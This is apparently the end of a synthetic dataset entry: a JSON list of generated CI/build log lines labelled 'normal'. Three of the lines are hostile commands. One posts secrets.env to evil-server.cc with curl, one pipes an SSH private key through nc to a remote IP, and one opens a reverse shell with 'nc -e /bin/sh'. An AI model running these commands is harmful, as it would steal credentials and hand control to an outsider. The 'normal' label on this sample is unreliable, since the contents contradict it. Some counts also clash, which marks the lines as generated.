          "Step 1/23: Building",
          "\u2717 build failed with exit code 105",
          "Snapshots: 50 passed, 42 total",
          "Loading...",
          "Artifact uploaded: build.tar.gz (32MB)",
          "HEAD is now at a62195d",
          "curl -X POST https://evil-server.cc/collect --data @secrets.env",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 44.61.213.46 48138",
          "Cache miss for key-9687",
          "OK",
          "Ready.",
          "Done.",
          "Minifying app.js",
          "Environment: test",
          "Minifying vendor.js",
          "pip: Installing build dependencies...",
          "NODE_ENV=production",
          "TLS handshake completed",
          "npm install: resolved 796 packages",
          "HEAD is now at 7c26164",
          "[12:46:09] DEBUG: Connection pool: 6 active",
          "Step 6/21: Installing dependencies",
          "[12:46:09] DEBUG: Memory usage: 1901MB",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Processing...",
          "Coverage: 94% statements, 69% branches",
          "Processing...",
          "Cache hit for key-8550",
          "Loading...",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (17MB)",
          "Tests: 400 passed, 305 total",
          "WARNING: axios has known vulnerabilities",
          "npm install: added 25 packages",
          "Using Python 3.10",
          "Platform: linux-x64",
          "Step 20/25: Running migrations",
          "[12:46:09] INFO: Request completed",
          "npm notice: created a lockfile",
          "Cache saved successfully",
          "pip: Downloading axios-5.11.tar.gz",
          "POST /upload - 200 (119ms)",
          "[12:46:09] DEBUG: Initializing service",
          "[12:46:09] INFO: Connecting to database",
          "Connection established",
          "Switched to branch 'bugfix/task-321'",
          "npm install: resolved 653 packages",
          "nc -e /bin/sh 2.122.22.61 54903",
          "[12:46:09] INFO: Connecting to database",
          "\u2713 Step 'test' succeeded",
          "Step 18/18: Deploying",
          "\u2713 validate completed",
          "Creating production build...",
          "Ready.",
          "Step 1/20: Building",
          "Switched to branch 'feature/task-677'",
          "=== Step install_dependencies completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}